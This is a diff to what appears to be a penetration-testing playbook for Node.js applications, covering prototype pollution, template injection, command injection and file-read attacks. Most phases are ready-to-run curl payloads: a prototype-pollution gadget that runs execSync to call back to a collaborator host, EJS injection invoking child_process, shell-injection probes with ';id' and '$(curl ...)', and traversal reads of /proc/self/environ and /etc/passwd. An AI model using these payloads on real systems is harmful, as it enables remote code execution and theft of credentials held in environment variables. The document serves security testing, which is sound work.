@@ -14,7 +14,7 @@ Prototype Pollution reaching a sink in Node.js backend = Critical RCE.
 **Highest-value chains:**
 - **Prototype Pollution → RCE** — `__proto__` injection via `lodash.merge` / `Object.assign` → polluted prototype reaches `child_process.exec` or `vm.runInNewContext` sink
 - **Express trust proxy** — `app.set('trust proxy', true)` without validation → attacker sets `X-Forwarded-For` to bypass IP allowlists or rate limits
-- **EJS/Pug SSTI** — template engine receives user input → `{{= process.mainModule.require('child_process').execSync('id') }}`
+- **EJS/Pug SSTI** — template engine receives user input → EJS `<%= process.mainModule.require('child_process').execSync('id') %>` (not `{{= }}`; that is Handlebars)
 - **`child_process` injection** — user input interpolated into shell command string → OS command injection
 - **`require()` path traversal** — attacker-controlled module path → load arbitrary file as JS
 
@@ -53,7 +53,10 @@ curl -s "https://$TARGET/nonexistent-path-xyz" | grep -i "node\|express\|cannot 
 ## Phase 2 — Prototype Pollution Detection
 
 ```bash
-# JSON body injection — test if __proto__ is accepted
+# JSON.parse('{"__proto__":...}') does NOT pollute Object.prototype by itself.
+# A 200 that stores the key "__proto__" is a weird field. Pollution means a LATER
+# request that did not send the key changes shape, status, or an authz flag.
+# The merge has to be recursive (lodash.merge, _.set, hoek, deep-extend, minimist, qs).
 curl -s -X POST https://$TARGET/api/merge \
   -H "Content-Type: application/json" \
   -d '{"__proto__": {"polluted": "yes"}}'
@@ -81,10 +84,12 @@ curl -s -X POST https://$TARGET/api/any -H "Content-Type: application/json" \
 ```
 
 **Prototype-pollution decision tree (generic, any stack):**
-1. Does the app accept `__proto__` / `constructor.prototype` via JSON body, query string (qs/express), or multipart? Test all three parsers — one is often unprotected.
+1. Does the app accept `__proto__` / `constructor.prototype` via JSON body, query string (qs/express/fastify), or multipart? Test all three parsers — one is often unprotected. Express 5 changed the default query parser to `simple` (flat keys, null-prototype object) — `?__proto__[x]=` stays a harmless string key there, but the JSON body parser and any explicitly-enabled `extended` (qs) parser are still live.
 2. Confirm pollution: reflected key (easy) OR blind shape-change (`json spaces`, `status`, `content-type` override). Blind counts.
 3. Find the sink the polluted key reaches: template-engine options (EJS `outputFunctionName`, Pug/Handlebars), `child_process` spawn options (`shell`, `env`, `NODE_OPTIONS`), `require`/`import`, or ajv/validation bypass (`__proto__` sets a default that satisfies a schema → mass-assignment).
 4. No RCE sink reachable? A pollution that flips an authz flag or validation default is still High (privilege escalation / mass assignment) — report that impact, don't overclaim RCE.
+
+**Not just Express:** Fastify `trustProxy: true` and Koa `app.proxy = true` are the same XFF bug as Phase 4. NestJS `ValidationPipe({ whitelist: false })` is mass assignment (`hunt-api-misconfig`), not PP. User input in `eval` / `new Function` / `vm.runInNewContext` is RCE once a unique marker or one OOB returns — prove it under Phase 6, do not spray every JSON field.
 
 ---
 
@@ -93,16 +98,13 @@ curl -s -X POST https://$TARGET/api/any -H "Content-Type: application/json" \
 ```bash
 # If pollution is confirmed, attempt to reach dangerous sinks
 
-# Sink 1: child_process via options.shell pollution
+# Sink 1: child_process env gadget. --inspect= does not phone home.
+# Node 18.4+ / 20 copies spawn options, so this often no longer fires — a 200 is not RCE.
+# Proof is one hit on UNIQUE.collab after a later request that spawns a process.
+# If it never fires, drop this sink and use the template gadgets below.
 curl -s -X POST https://$TARGET/api/update \
   -H "Content-Type: application/json" \
-  -d '{
-    "__proto__": {
-      "shell": "node",
-      "NODE_OPTIONS": "--require /proc/self/fd/0",
-      "env": {"NODE_OPTIONS": "--inspect=COLLAB_HOST"}
-    }
-  }'
+  -d '{"__proto__":{"NODE_OPTIONS":"--require /proc/self/environ","env":{"EVIL":"console.log(require(\"child_process\").execSync(\"curl http://UNIQUE.collab/pp\").toString())//"}}}'
 
 # Sink 2: lodash template pollution (CVE-2021-23337)
 curl -s -X POST https://$TARGET/api/render \
@@ -182,6 +184,8 @@ curl -s -X POST https://$TARGET/api/render -H "Content-Type: application/json" \
 
 # Confirm with OOB if output is not reflected: replace id with
 #   curl http://UNIQUE.COLLAB/ssti  (unique subdomain) and poll the listener.
+# ESM: process.mainModule is often null. Swap require(...) for
+#   process.getBuiltinModule('child_process')  (Node 20.16+/22+) and retry once.
 ```
 
 ---
@@ -192,7 +196,8 @@ curl -s -X POST https://$TARGET/api/render -H "Content-Type: application/json" \
 # Look for endpoints that run shell commands with user input
 # Signals: /api/convert, /api/exec, /api/ping, /api/scan
 
-# Basic injection test
+# `;` and `$()` only reach a shell. If the marker is echoed as data and nothing calls back,
+# the sink is spawn/execFile — inject a separate argv element, not shell syntax.
 curl -s "https://$TARGET/api/ping?host=127.0.0.1;id"
 curl -s "https://$TARGET/api/convert?file=test.pdf;curl+COLLAB_HOST/ci"
 curl -s -X POST https://$TARGET/api/exec \
@@ -208,13 +213,17 @@ curl -s "https://$TARGET/api/dns?host=\$(curl+COLLAB_HOST/dns-ci).example.com"
 ## Phase 7 — /proc/self/environ Exfil
 
 ```bash
-# If LFI exists on Node.js app, /proc/self/environ leaks env vars
-curl -s "https://$TARGET/api/file?path=/proc/self/environ"
-curl -s "https://$TARGET/api/read?file=../../../../proc/self/environ"
+# require() / static root. Proof is file bytes outside the intended root, or one callback
+# from a module you were allowed to place. A stack trace that mentions require is not RCE.
+curl -s "https://$TARGET/api/module?name=../../../../proc/self/environ"
+curl -sI "https://$TARGET/static/..%2f..%2fpackage.json"
 
-# Also check:
-curl -s "https://$TARGET/api/file?path=/proc/self/cmdline"  # full command line
-curl -s "https://$TARGET/api/file?path=/proc/self/cwd"       # working directory
+# LFI: ../ walk AND an absolute path. path.resolve(root, userInput) discards root when
+# userInput is absolute. path.join does NOT (join('/uploads','/etc/passwd') → '/uploads/etc/passwd' on POSIX).
+curl -s "https://$TARGET/api/read?file=../../../../proc/self/environ"
+curl -s "https://$TARGET/api/file?path=/etc/passwd"
+curl -s "https://$TARGET/api/file?path=/proc/self/environ"
+curl -s "https://$TARGET/api/file?path=/proc/self/cmdline"
 ```
 
 ---
@@ -233,10 +242,11 @@ curl -s "https://$TARGET/api/file?path=/proc/self/cwd"       # working directory
 
 ## Validation
 
-✅ Prototype pollution: polluted key appears in a later response OR causes a provable blind shape-change (`json spaces`/`status`) body-diffed vs a clean baseline
+✅ Prototype pollution: a later request that did not send `__proto__` reflects the key or changes shape (`json spaces`/`status`) vs a clean baseline. The same response echoing the key is not pollution
 ✅ RCE chain: OOB callback on a unique subdomain received OR `id`/`whoami` output in response (not just "no error")
 ✅ Trust proxy: spoofed `X-Forwarded-For` accepted and demonstrably resets a rate counter or passes an IP allowlist — prove the state change, don't infer it
-✅ SSTI: `{{7*7}}`→49 for the right engine, then RCE confirmed by command output or OOB
+✅ SSTI: engine-correct detect first (`<%= 7*7 %>`→49 for EJS; Handlebars reflects `{{this}}` and does **not** eval `{{7*7}}`), then RCE via command output or OOB. `mainModule` miss after a detect hit → retry `getBuiltinModule` once
+✅ path.resolve override: file bytes from an absolute path the route should have rooted (e.g. `/etc/passwd` / `/proc/self/environ` marker), not `../` alone
 
 **Severity:**
 - Prototype pollution → RCE: Critical
